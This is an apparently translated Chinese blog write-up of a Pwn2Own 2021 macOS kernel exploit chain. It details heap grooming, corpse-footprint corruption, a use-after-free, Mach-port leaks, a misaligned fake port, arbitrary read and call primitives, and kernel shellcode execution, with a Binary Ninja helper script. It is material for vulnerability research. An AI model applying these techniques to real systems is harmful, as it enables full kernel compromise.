<p>资源可以用一个父资源和一个64位的偏移量来创建，这将子资源的GPU地址设置为父资源的地址加上偏移量。我们可以通过驱动程序的预期功能发现父资源的GPU地址，这样我们就可以知道偏移的数值。这样我们就可以完全控制写入界外的4个字节。</p>
<h1 id="Resource-Buffer-Allocation"><a href="#Resource-Buffer-Allocation" class="headerlink" title="Resource Buffer Allocation"></a>Resource Buffer Allocation</h1><p>我们的下一个任务是找到一个可以直接放在资源缓冲区后面的破坏目标，它的前4个字节对破坏是 “有用 “的。这将有助于了解资源缓冲区在内核内存中的分配方式和位置，以便我们能够可靠地控制在它周围分配的内容。</p>
<p>从Mach内核的角度来看，虚拟内存是通过<code>vm_map</code>对象的层次结构管理的。顶级地图，<code>kernel_map</code>，包含了整个内核的虚拟内存范围。子地图是在父地图（通常是<code>kernel_map</code>）中保留一个较小的虚拟地址范围。更多的信息可以<a target="_blank" rel="noopener" href="http://newosxbook.com/bonus/democratizingZones.pdf"><code>*OS Internals</code></a>中找到。</p>
<p>这样看，是不是还是应该啃一下<code>*OS Internals</code>这本书呢？</p>
<p>一个资源缓冲区被实现为一个<code>IOBufferMemoryDescriptor</code>，除此之外，还设置了<code>kIOMemoryPageable</code>选项。可分页内存描述符的后备缓冲区来自一组特殊的可分页<code>IOKit</code>分配的子地图，由全局结构<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/iokit/Kernel/IOLib.cpp.auto.html#:~:text=gIOKitPageableSpace"><code>gIOKitPageableSpace</code></a>管理。这个空间最多允许8个地图，每个512MB。</p>
<p>在可分页空间分配的主要入口是<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/iokit/Kernel/IOLib.cpp.auto.html#:~:text=IOIteratePageableMaps"><code>IOIteratePageableMaps</code></a>。这个算法非常简单：从有索引提示的子地图（上次成功分配的地图）开始，向后迭代，直到有地图能够为分配提供服务。如果没有足够的空间，就创建一个全新的512MB子地图。</p>
<h1 id="Ensuring-Reliable-Allocation-Placement"><a href="#Ensuring-Reliable-Allocation-Placement" class="headerlink" title="Ensuring Reliable Allocation Placement"></a>Ensuring Reliable Allocation Placement</h1><p>可分页空间似乎主要用于类似二进制<code>blob</code>的数据，所以我们选择在可分页空间之外的地方作为目标，即把资源缓冲区放在子地图的最末端，而把受害者对象紧随其后。</p>
<p>策略如下：</p>
<ol>
<li>用512MB的资源强制分配一个全新的512MB的子表；<ol>
<li>在正常使用的情况下，系统极不可能在<code>kernel_map</code>中存在一个512MB的空洞，这就有效地保证了我们的资源将被放置在虚拟内存的末端。</li>
</ol>
</li>
<li>将数据缓冲区0放置在新地图的末端<ol>
<li>释放512MB的资源</li>
<li>分配一个填充资源来填充地图的开始，大小为<code>512MB - &lt;dbuf0的大小&gt;</code>。</li>
<li>分配 <code>dbuf0</code></li>
</ol>
</li>
<li>分配受害者对象，为了保证可靠性，受害者对象应该足够大，可以放在虚拟内存的末端（即<code>kernel_map</code>中没有足够大的洞来容纳受害者对象）。</li>
</ol>
<p>现在需要找到一个 “大 “的受害者对象。</p>
<h1 id="Identifying-Viable-Corruption-Targets-Victim-Objects"><a href="#Identifying-Viable-Corruption-Targets-Victim-Objects" class="headerlink" title="Identifying Viable Corruption Targets &#x2F; Victim Objects"></a>Identifying Viable Corruption Targets &#x2F; Victim Objects</h1><p>内核中有几个常见的内存分配函数，例如<code>kernel_memory_allocate</code>和<code>kalloc</code>。<code>kalloc</code>是内核代码中动态分配内存的最常见方法。</p>
<p>对于<code>kalloc</code>来说，<code>0x4000</code>或更小的分配是由<code>zone</code>分配器处理的。<code>0x80000（512KB</code>）或更小的内存会被分配到<code>kalloc_map</code>，一个特殊的子<code>map</code>。更大的则直接从<code>kernel_map</code>分配。如果我们需要，我们可以完全填满<code>kalloc_map</code>，这样进一步的分配就会回到<code>kernel_map</code>。这意味着，如果我们要寻找通过<code>kalloc</code>分配的候选受害对象，我们应该寻找至少能达到<code>0x4001</code>字节的分配。</p>
<p><a target="_blank" rel="noopener" href="https://binary.ninja/">Binary Ninja</a>分析在这里相当有帮助，允许我们用脚本搜索任何对各种分配函数的调用，参数可能足够大。(分析将需要相当长的时间，你可能需要强制分析一些函数以使脚本工作，和&#x2F;或添加<code>__noreturn</code>以使其恐慌)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># if xref&#x27;ing kalloc, the internal kalloc function has no symbol name</span></span><br><span class="line"><span class="comment"># need to get the address manually (tailcalled from kalloc_external)</span></span><br><span class="line">xrefs = bv.get_callers(<span class="number">0xffffff800028c8d0</span>)</span><br><span class="line">minsize = <span class="number">0x4001</span></span><br><span class="line">sites = []</span><br><span class="line">sizes = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ref <span class="keyword">in</span> xrefs:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">repr</span>(ref))</span><br><span class="line">    mlil = ref.function.get_low_level_il_at(ref.address).mlil</span><br><span class="line">    <span class="keyword">if</span> mlil.operation <span class="keyword">not</span> <span class="keyword">in</span> (MLIL_CALL, MLIL_TAILCALL):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;bad mlil&quot;</span>)</span><br><span class="line"></span><br><span class="line">    size = mlil.operands[<span class="number">2</span>][<span class="number">1</span>] <span class="comment"># change second index depending on which arg is size</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;size: &quot;</span>+<span class="built_in">repr</span>(size))</span><br><span class="line">    vals = size.possible_values</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> vals.<span class="built_in">type</span> <span class="keyword">in</span> (RegisterValueType.ConstantPointerValue, RegisterValueType.ConstantValue)\</span><br><span class="line">            <span class="keyword">and</span> vals.value &lt; minsize:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> vals.<span class="built_in">type</span> <span class="keyword">in</span> (RegisterValueType.UnsignedRangeValue, RegisterValueType.SignedRangeValue):</span><br><span class="line">        maxx = <span class="built_in">max</span>(r.end <span class="keyword">for</span> r <span class="keyword">in</span> vals.ranges)</span><br><span class="line">        <span class="keyword">if</span> maxx &lt; minsize:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> vals.<span class="built_in">type</span> == RegisterValueType.InSetOfValues:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(v &lt; minsize <span class="keyword">for</span> v <span class="keyword">in</span> vals.values):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    sites.append(ref)</span><br><span class="line">    sizes.append(vals)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n\n&quot;</span>+<span class="string">&quot;=&quot;</span>*<span class="number">34</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sites)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%016x %-48s %r&quot;</span>%(sites[i].address, sites[i].function.symbol.full_name, sizes[i]))</span><br></pre></td></tr></table></figure>

<h1 id="Corpse-Footprints"><a href="#Corpse-Footprints" class="headerlink" title="Corpse Footprints"></a>Corpse Footprints</h1><p>我们的漏洞所针对的受害者结构涉及<a target="_blank" rel="noopener" href="http://newosxbook.com/files/corpses.pdf"><code>corpse</code></a>。在XNU中，<code>corpse</code>是一个分叉的、死亡的任务版本，通常在某些异常情况下产生。也可以通过调用<code>task_generate_corpse</code>直接生成一个，它返回一个代表<code>corpse</code>的<code>mach</code>端口。</p>
<blockquote>
<p>注意：在<code>Pwn2Own 2021</code>之后，苹果更新了<code>WebContent</code>沙盒，以阻止这个接口。</p>
</blockquote>
<p>在创建一个<code>corpse</code>时，会以不同大小的二进制格式收集其内存足迹的一种快照。它在<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/vm/vm_map.c.auto.html#:~:text=kernel_memory_allocate"><code>vm_map_corpse_footprint_collect</code></a>中直接从<code>kernel_map</code>和<code>kernel_memory_allocate</code>中分配。其大小取决于任务的虚拟内存大小，最大为8MB。</p>
<p>该大小被存储在分配的第一个字段中，即<code>cf_size</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_map_corpse_footprint_header</span> &#123;</span></span><br><span class="line">    <span class="type">vm_size_t</span>       cf_size;        <span class="comment">/* allocated buffer size */</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>而在<code>vm_map_corpse_footprint_destroy</code>中销毁<code>corpse</code>时，<code>cf_size</code>被传递给<code>vm_deallocate</code>。</p>
<p>通过破坏<code>cf_size</code>，我们可以人为地扩大<code>Footprint</code>，使其与相邻的受害者分配重叠，然后这些分配将与<code>Footprint</code>一起被释放。</p>
<p>破坏前：</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/p2o_2021_eop_footprint_before.svg" alt="p2o_2021_eop_footprint_before"></p>
<p>破坏后，<code>Footprint</code>覆盖了受害者：</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/p2o_2021_eop_footprint_after.svg" alt="p2o_2021_eop_footprint_after"></p>
<p>这允许我们诱导受害者对象的UAF，尽管为了可靠起见，我们还是应该坚持使用足够大的分配。这种UAF技术有一个注意事项，即受害者对象必须是可分页内存，而不是 <code>wired</code>内存。</p>
<h1 id="Wired-Kernel-Allocations"><a href="#Wired-Kernel-Allocations" class="headerlink" title="Wired Kernel Allocations"></a>Wired Kernel Allocations</h1><p>绝大多数的内核分配是<code>wired</code>的。当用<code>vm_map_remove</code>删除这些映射时，一个标志<code>VM_MAP_REMOVE_KUNWIRE</code>表明虚拟内存条目的<code>wired</code>计数（一种<code>refcount</code>）应该被减去。无论哪种方式，在实际删除该条目之前，它都会等待<code>wired</code>计数为零。</p>
<p><code>corpse footprint</code>是罕见的可分页分配对象之一，因此在释放时，<code>unwire</code>标志将不会被使用。如果重叠的受害者分配是<code>wired</code>的，内核线程就会挂起，等待一个不会发生的<code>unwire</code>。在实际应用中，这意味着我们只能对一个可分页的受害者分配进行UAF。</p>
<p>方便的是，我们已经遇到了一个潜在的有用的可分页分配。<code>IOKit</code>可分页空间。在这个阶段的计划变成了：</p>
<ol>
<li>分配一个新的可分页<code>map</code>，结尾有一个数据缓冲区；</li>
<li>分配<code>corpse footprint</code>；</li>
<li>在<code>footprint</code>之后分配一个新的可分页<code>map</code>；</li>
<li>在新的<code>map</code>中分配第二个数据缓冲区；</li>
<li>触发<code>bug</code>，扩大<code>footprint</code>；</li>
<li>销毁<code>corpse</code>，释放<code>footprint</code>和新的<code>map</code>；</li>
<li>第二个数据缓冲区现在指向已释放的内存。</li>
</ol>
<p>使用<code>VPHAL</code>标记（但这次是用<code>in-bounds</code>偏移），我们可以很容易地将任意的64位值写入释放的数据缓冲区。然而，为了保证可靠性，最好是尝试用足够大的对象来回收释放的数据缓冲区内存。</p>
<h1 id="Initial-Kernel-Information-Leaks"><a href="#Initial-Kernel-Information-Leaks" class="headerlink" title="Initial Kernel Information Leaks"></a>Initial Kernel Information Leaks</h1><p>在这一点上，我们已经把4个字节的越界写入变成了任意破坏任何大型分配内容的能力。为了获得一些信息泄露，我们将滥用<code>mach</code>信息体，它的分配大小上限大约为64MB。</p>
<p>一些相关的背景：<code>Mach</code>消息体有一个头，后面是消息的其余部分。消息可以是 “简单的 “或 “复杂的”，由头字段中的一个比特<code>msgh_bits</code>表示。一个简单的消息是简单的原始字节。一个复杂的消息可以包含几个描述符，它们可以用来向消息接收者发送端口权限和&#x2F;或内存映射。在这两种情况下，报头字段<code>msgh_size</code>表示整个消息体的缓冲区大小。</p>
<p><code>Mach</code>消息在内核中由<code>ipc_kmsg</code>结构表示，其中包含一个字段<code>ikm_header</code>，指向从用户空间复制和转换过来的消息体。这个消息体将是我们的破坏目标。</p>
<p><code>mach_port_peek</code>允许 “偷看 “一个端口接收队列中的第一条消息。其中一个被偷看的值是消息的<code>trailer</code>，通常由<code>mach</code>内核附加到消息体上。<code>trailer</code>通常位于<code>ikm_header + ikm_header-&gt;msgh_size</code>，但通过破坏<code>msgh_size</code>，我们可以将<code>trailer</code>移到界外，以获得<code>out-of-bound</code>读。</p>
<blockquote>
<p>注意：<code>mach_port_peek</code>也不再被<code>WebContent</code>沙箱所允许。</p>
</blockquote>
<p>破坏前：</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/p2o_2021_eop_leak_target_before.svg" alt="p2o_2021_eop_leak_target_before"></p>
<p>破坏后：</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/p2o_2021_eop_leak_target_after.svg" alt="p2o_2021_eop_leak_target_after"></p>
<p>我们在两个不同的泄漏目标上使用这种技术：</p>
<ol>
<li>第一个是包含端口描述符的<code>mach</code>信息体。<ol>
<li>当从用户空间转换时，端口描述符中的数字<code>mach</code>端口被一个指向相应<code>ipc_port</code>对象的指针所取代。我们需要泄露两个紧邻的<code>ipc_port</code>对象。其原因将在下一节解释。</li>
</ol>
</li>
<li>第二个泄漏目标将是一个包含单个<code>OSData</code>对象的<code>OSArray</code>的内容。<ol>
<li>泄露<code>OSData</code>对象的地址将给我们提供一个位置，以便以后获得<code>text</code>泄露（<code>OSData</code>的第一个字段是<code>vtable</code>）。</li>
</ol>
</li>
</ol>
<p>在过去（<a target="_blank" rel="noopener" href="https://blog.siguza.net/v0rtex/">1</a>，<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-1.html">2</a>），使用<code>OSObject</code>进行内核开发已经做过很多次了。通过将<code>OSObject</code>附加到<code>IOSurface</code>的属性名上，它们可以方便地被分配&#x2F;释放（这是我们在<code>WebContent</code>沙盒中允许做的）。这些对象在内核中从类似XML的文本格式或二进制格式被反序列化。</p>
<p>二进制格式（由<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/libkern/c++/OSSerializeBinary.cpp.auto.html#:~:text=OSUnserializeBinary"><code>OSUnserializeBinary</code></a>反序列化）允许对分配的大小进行更多的控制；例如，我们可以分配一个有65536个元素容量的<code>OSArray</code>，然后在其中放置一个<code>OSData</code>，其余部分为空。</p>
<h1 id="Circumventing-zone-id-require-with-a-Misaligned-Port"><a href="#Circumventing-zone-id-require-with-a-Misaligned-Port" class="headerlink" title="Circumventing zone_id_require with a Misaligned Port"></a>Circumventing <code>zone_id_require</code> with a Misaligned Port</h1><p>破坏<code>OSArray</code>的内容，使其包含一个假的<code>OSObject</code>指针，这将是相对简单的。由于这些是C++类，我们会立即通过一个假的<code>vtable</code>劫持控制流。然而，我们至少需要一个<code>text</code>泄漏（内核代码地址），以便有地方可以跳转到。我们还需要知道首先将假的<code>OSObject</code>指向哪里（然后它将包含假的<code>vtable</code>等）；或者换句话说，我们控制的数据的地址。</p>
<p>为了获得这些泄漏，我们需要对<code>mach</code>端口进行一些创意。我们要制作一个假的端口，目的是为了获得一个半任意的读取。创建一个假端口的最大挑战是绕过各种<code>zone_require/zone_id_require</code>调用。这个<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/06/a-survey-of-recent-ios-kernel-exploits.html"><code>Project Zero</code></a>的帖子很好地解释了这一点。</p>
<blockquote>
<p><code>zone_require</code>是<code>iOS 13</code>中引入的一个软件缓解措施，增加了对某些从预期的<code>zalloc</code>区域分配的指针，在使用前进行检查。iOS内核缓存中最常见的<code>zone_require</code>检查是对Mach端口的检查；例如，每次<code>ipc_port</code>被锁定时，<code>zone_require()</code>函数被调用，以检查包含Mach端口的分配是否位于<code>ipc.ports</code>区域（而不是，例如，用<code>kalloc()</code>分配的<code>OSData</code>缓冲区）。</p>
</blockquote>
<p>为了解决这个问题，我们可以利用<code>zone_require</code>不关心正确的对齐方式，只关心指针位于适当的区域内。我们将使用我们先前泄露的两个相邻的端口，并在这两个端口之间制作一个错位的假 <code>ipc_port</code>。</p>
<p>为了把这个假端口引入我们的<code>ipc</code>空间，我们将再次破坏一个<code>mach</code>消息体。我们不破坏消息体的<code>msgh_size</code>，而是进行几次写操作，把它变成一个复杂的消息体，包含一个端口描述符，有一个发送到我们假端口的权利。如果我们能在收到这个消息后存活下来，一个新的发送到假端口的发送权将被添加到我们的<code>ipc</code>空间。</p>
<ul>
<li><p>另一个附带说明：我们不确定是否有可能将这种技术应用于非x86平台，因为有一些签名验证代码在x86平台上基本上是被忽略的。在复制一个<code>mach</code>消息后，内核用<code>ikm_sign</code>计算出消息体和所有描述符的签名。当复制出消息时，它重新计算签名并检查是否匹配，否则就会<code>panic</code>。</p>
</li>
<li><p>理论上，当内核在计算签名之前还在复制描述符的时候，应该有可能进行消息体的破坏。如果有可能通过强迫内核花很长的时间来复制所有的描述符来使竞赛变得可靠，或者以某种方式检查竞赛是否失败，并解除对消息的破坏和重试，这种技术就有可能发挥作用。</p>
</li>
</ul>
<p>当接收消息时，端口描述符在<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/ipc/ipc_kmsg.c.auto.html#:~:text=ipc_kmsg_copyout_port_descriptor"><code>ipc_kmsg_copyout_port_descriptor</code></a>中被处理，尽管大部分的逻辑是在<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/ipc/ipc_object.c.auto.html#:~:text=ipc_object_copyout%28"><code>ipc_object_copyout</code></a>中进一步处理。仔细追踪假的<code>ipc</code>对象是如何被处理&#x2F;检查的，这给了我们一些约束，即假端口的一些字段应该如何看才能存活。</p>
<ul>
<li><code>io_bits</code>：偏移量为0的<code>int</code>大小的位域<ul>
<li>高位必须被设置，表示端口处于活动状态 [<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/ipc/ipc_object.c.auto.html#:~:text=if%20%28!io_active%28object%29%29,-%7B%0A%09%09%09io_unlock">1</a>] 。</li>
<li>剩余的高位15位表示对象类型，必须是1以外的任何值（<code>IOT_PORT_SET</code>）。这个值决定了<code>ipc_object_validate</code>需要哪个区，我们希望它是端口区 [<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/ipc/ipc_object.c.auto.html#:~:text=if%20%28io_otype%28object%29%20!=%20IOT_PORT_SET%29">2</a>] 。</li>
<li>掩码为<code>0x400</code>的位必须为0，以表示<code>kobject</code>没有标签(这将触发一些我们宁愿避免的额外检查) [<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/ipc/ipc_object.c.auto.html#:~:text=ip_label_check">3</a>]</li>
</ul>
</li>
<li><code>io_lock_data</code>。8字节的值，位于偏移量8。必须为0，表示没有锁，否则在试图锁定端口时，会发生死锁&#x2F;恐慌 [<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/ipc/ipc_object.c.auto.html#:~:text=io_lock%28object%29%3B,-if%20%28!io_active%28object">4</a>]</li>
</ul>
<p>这些是安全接收发送权到假端口的唯一要求。在偏移量0处有一些半控制位，而在偏移量8处有一个零。</p>
<p>对于我们之前泄露的相邻的端口，将第一个端口称为A，第二个称为B。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/p2o_2021_eop_fake_port_misalignment.svg" alt="p2o_2021_eop_fake_port_misalignment"></p>
<p><code>io_bits</code> 与 <code>A-&gt;seqno</code> 重叠，是一个序列号。这个值通常在每次向端口发送消息时被递增，但它也可以通过<code>mach_port_set_seqno</code>手动设置（这个调用不再被沙盒允许）。因此，它是一个完全可控的 32 位值，允许我们满足 <code>io_bits</code> 上的约束。</p>
<p><code>io_lock_data</code>与端口<code>A</code>的<code>qcontext</code>、<code>qlimit</code>和<code>msgcount</code>重叠。<code>qcontext</code>通常为0。<code>msgcount</code>是当前在接收队列上的消息数量，如果没有，则为0。<code>qlimit</code>是在接收队列上可以放置多少消息的上限。它的默认值是 5，但是可以用 <code>mach_port_set_attributes</code> 的 <code>MACH_port_LIMITS_INFO</code> 语句设置为 0。因此，所有3个字段都可以是0，满足<code>io_lock_data</code>的约束。</p>
<p><code>ip_srights</code>字段记录了一个端口所存在的发送权限的数量。发送含有发送权的端口描述符的<code>mach</code>消息时，这个字段会增加1。类似地，在同一消息中发送<code>N</code>个有发送权的端口描述符，会增加<code>N</code>个。</p>
<p><code>ikmq_base</code>字段指向接收队列头部的<code>ipc_kmsg</code>。这个结构包含许多有趣的字段，在这种情况下，最相关的将是<code>ikm_header</code>，一个指向消息正文的指针。</p>
<p>由于假端口的<code>ip_srights</code>字段与<code>B-&gt;ikmq_base</code>重叠，我们可以发送假端口的端口描述符来增加<code>B-&gt;ikmq_base</code>，同样也可以接收这些端口描述符来解压缩&#x2F;解扰。这就引出了一个问题：<code>B-&gt;ikmq_base</code>的增量可以指向什么，或者换句话说，通常位于<code>ipc_kmsg</code>结构之后的东西。</p>
<p>在发送消息时，如果消息体足够小，那么消息体就会在<code>ipc_kmsg</code>结构之后内联存储，否则就会放在一个单独的分配中（这个逻辑在<code>ipc_kmsg_alloc</code>中）。如果发送给<code>B</code>的消息是这样的消息，将<code>ikmq_base</code>增加适当的次数将直接指向内联体，这是完全受控的。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/p2o_2021_eop_kmsg_increment.svg" alt="p2o_2021_eop_kmsg_increment"></p>
<p>我们现在有能力完全伪造<code>B</code>的接收队列头部的<code>ipc_kmsg</code>。具体来说，我们将把对<code>B-&gt;ikmq_base-&gt;ikm_header</code>的控制变成一个受限的任意读取。</p>
<p>一般的想法是重复以下内容：</p>
<ol>
<li>向<code>B</code>发送一个小消息，以假的<code>ipc_kmsg</code>内容为主体；</li>
<li>到一个独立的辅助端口，使用端口描述符向假端口发送<code>N</code>个发送权限，增加<code>B-&gt;ikmq_base</code>；</li>
<li>在<code>B</code>上执行一些非破坏性的操作，以使用假的<code>ikm_header</code>来进行约束性的阅读；</li>
<li>接收端口描述符，将<code>B-&gt;ikmq_base</code>递减到正常值；</li>
<li>从<code>B</code>处接收清空队列，根据需要用一个新的假的<code>ipc_kmsg</code>重复。</li>
</ol>
<h1 id="Pseudo-arbitrary-Kernel-Memory-Read"><a href="#Pseudo-arbitrary-Kernel-Memory-Read" class="headerlink" title="Pseudo-arbitrary Kernel Memory Read"></a>Pseudo-arbitrary Kernel Memory Read</h1><p>我们可以用2种方法将假的<code>ikm_header</code>利用到读原语中。</p>
<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>第一个使用<code>MACH_RCV_LARGE</code>，这是一个在接收<code>Mach</code>消息时可以指定的标志。如果这个标志被设置，并且要接收的消息大于用户空间接收缓冲区的大小，内核就会把消息留在队列中，并向用户空间写出需要的空间。</p>
<p>所需的大小由<code>ipc_kmsg_copyout_size</code>计算。这个计算是必要的，因为当从用户空间复制进来的时候，端口名（32位）被转换成相应的指针（64位），所以从内核和用户空间的角度来看，有一个大小的差异。所需的大小被计算为<code>ikm_header-&gt;msgh_size - 8</code>，然后如果信息是复杂的，每个端口描述符都会发生额外的减法。</p>
<p>对于<code>text</code>（代码地址）泄露，我们想读出我们之前泄露的数据指针的<code>OSData</code>对象的<code>vtable</code>。我们将把<code>ikm_header</code>指向<code>OSData - 4</code>，然后尝试用一个非常小的接收缓冲区接收消息，并设置<code>MACH_RCV_LARGE</code>选项。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/p2o_2021_eop_osdata_leak.svg" alt="p2o_2021_eop_osdata_leak"></p>
<p><code>msgh_size</code>与<code>vtable</code>的低4字节重合。内核<code>ASLR</code>没有提供足够的熵来随机化内核滑块的高32位，所以我们实际上有了我们的<code>text</code>泄漏。</p>
<p>这里的一个限制是<code>OSData</code>之前的内存必须被映射，因为<code>ipc_kmsg_copyout_size</code>会使用<code>msgh_bits</code>检查消息是否复杂。安全的做法是重复泄漏过程，直到找到一个非页对齐的<code>OSData</code>，确保<code>OSData-4</code>将被映射。</p>
<p>第二个潜在的问题是我们不知道<code>msgh_bits</code>是否会有复杂位被设置。如果它没有，一切都很好。如果有，<code>msgh_descriptor_count</code>（复杂信息中描述符的数量）将与<code>OSData</code>的容量重叠。通过分配<code>OSData</code>的大小为0，容量也将同样为0。这将确保不会对端口描述符的<code>msgh_size</code>进行额外减法。</p>
<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>第二个受限的读取方法使用<code>mach_port_peek</code>。以前，我们用<code>mach_port_peek</code>和一个损坏的<code>msgh_size</code>来读取一个越界的<code>trailer</code>。这一次，我们控制<code>ikm_header</code>来代替。<code>trailer</code>是从<code>ikm_header + ikm_header-&gt;msgh_size</code>读取的，所以我们需要确保有一个合适的假<code>msgh_size</code>。最简单的是在我们希望读取的数值前不久在内存中找到一个零，这样<code>trailer</code>就会直接从假的<code>ikm_header</code>中复制出来，而不用进行加法。</p>
<p>我们将使用这种技术来泄露受控数据的地址。我们首先创建一个辅助端口，用前面使用的老式<code>mach_port_peek</code>技术泄露其地址。然后我们向这个端口发送一个大的<code>mach</code>消息，它将在虚拟内存的末端，在资源缓冲区<code>dbuf0</code>的一个恒定偏移处分配消息体。使用伪任意的<code>mach_port_peek</code>读取，我们就可以遍历<code>ipc_port</code>对象，找到消息体指针。减去适当的偏移量，我们就得到了<code>dbuf0</code>的地址。这个内存是在内核和用户空间之间共享的，所以我们有一个包含受控数据的内核地址。</p>
<h1 id="Arbitrary-Function-Call-Primitive"><a href="#Arbitrary-Function-Call-Primitive" class="headerlink" title="Arbitrary Function Call Primitive"></a>Arbitrary Function Call Primitive</h1><p>有了<code>text</code>泄漏和共享内存资源缓冲区的地址，我们可以继续劫持控制流。我们分配了一个大的<code>OSArray</code>，并破坏了一个指向资源缓冲区的入口。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/p2o_2021_eop_osarray_corruption.svg" alt="p2o_2021_eop_osarray_corruption"></p>
<p>这给了我们一个假的C++对象的控制，即<code>vtable</code>控制。</p>
<p>为了启动一个虚拟调用，我们从其相关的<code>IOSurface</code>查询被破坏的<code>OSArray</code>。代码首先在序列化之前复制被查询的值。在这种情况下，拷贝是由<code>OSArray::copyCollection</code>执行的，它调用<code>OSArray::initWithObjects</code>来使用现有对象初始化一个新数组。这就在后备存储上进行了迭代，并通过虚拟调用 <code>taggedRetain</code> 来保留每个对象（其中第一个对象我们已经损坏了）。这给了我们一个任意的函数调用，其中有一个受控的<code>this</code>参数。</p>
<p>我们把这个调用指向<code>OSSerializer::serialize</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OSSerializer::serialize(OSSerializer* this, OSSerialize* s) &#123;</span><br><span class="line">    <span class="keyword">return</span> this-&gt;callback(this-&gt;target, this-&gt;ref, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们现在有一个控制前两个参数的任意的函数调用。通过将这个调用引导回<code>OSSerialize::serialize</code>，我们可以利用<code>s</code>参数来获得一个有<code>3</code>个受控参数的任意函数调用。这个方法<a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Donenfeld-Rooten-Apples-Vulnerability-Heaven-In-The-IOS-Sandbox.pdf">以前也用过</a>。</p>
<p>从被劫持的<code>taggedRetain</code>调用返回后，我们将回到<code>OSArray::initWithObjects</code>中，如果在数组中遇到一个空条目，它将中止复制。我们使用这种行为来干净地跳出。</p>
<p>有了这个基元，任意的读&#x2F;写就简化为调用<code>copyin</code>和<code>copyout</code>函数。</p>
<h1 id="Kernel-Shellcode-Execution"><a href="#Kernel-Shellcode-Execution" class="headerlink" title="Kernel Shellcode Execution"></a>Kernel Shellcode Execution</h1><p>从这里开始，作为内核获得任意代码执行是相对简单的。</p>
<p>我们用<code>kmem_alloc_external</code>为<code>shellcode</code>分配内存，然后用<code>copyin</code>把它复制进去。似乎没有一个方便的方法来标记这个只有<code>3</code>个受控参数的内存<code>rwx</code>，所以我们使用<code>vm_map_store_lookup_entry</code>来查找与<code>shellcode</code>内存相关的<code>vm_map_entry_t</code>，它包含映射的权限位。覆盖这些位就足以标记该条目为<code>rwx</code>。最后，我们调用<code>shellcode</code>本身。</p>
